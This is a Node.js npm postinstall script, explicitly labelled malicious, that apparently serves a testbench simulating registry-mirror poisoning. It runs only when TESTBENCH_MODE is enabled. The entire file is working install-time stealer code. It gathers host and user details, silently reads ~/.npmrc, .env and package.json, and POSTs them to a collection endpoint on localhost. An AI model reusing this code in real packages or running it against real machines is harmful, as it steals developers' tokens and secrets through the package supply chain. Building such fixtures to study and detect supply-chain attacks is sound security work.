/**
 * MALICIOUS POSTINSTALL SCRIPT
 * Executes when package is installed from compromised mirror
 * 
 * SAFETY: Only works in TESTBENCH_MODE
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const fs = require('fs');
  const os = require('os');
  const path = require('path');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: 'enterprise-utils',
    version: '1.0.0',
    attackType: 'registry-mirror-poisoning',
    source: 'compromised-mirror',
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    env: {
      NODE_ENV: process.env.NODE_ENV,
      REGISTRY: process.env.npm_config_registry || 'default'
    },
    files: {}
  };

  // Try to read sensitive files
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(process.cwd(), '.env'),
    path.join(process.cwd(), 'package.json')
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Exfiltrate data
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent
  });

  req.on('error', () => {
    // Silently fail
  });

  req.write(payload);
  req.end();
}
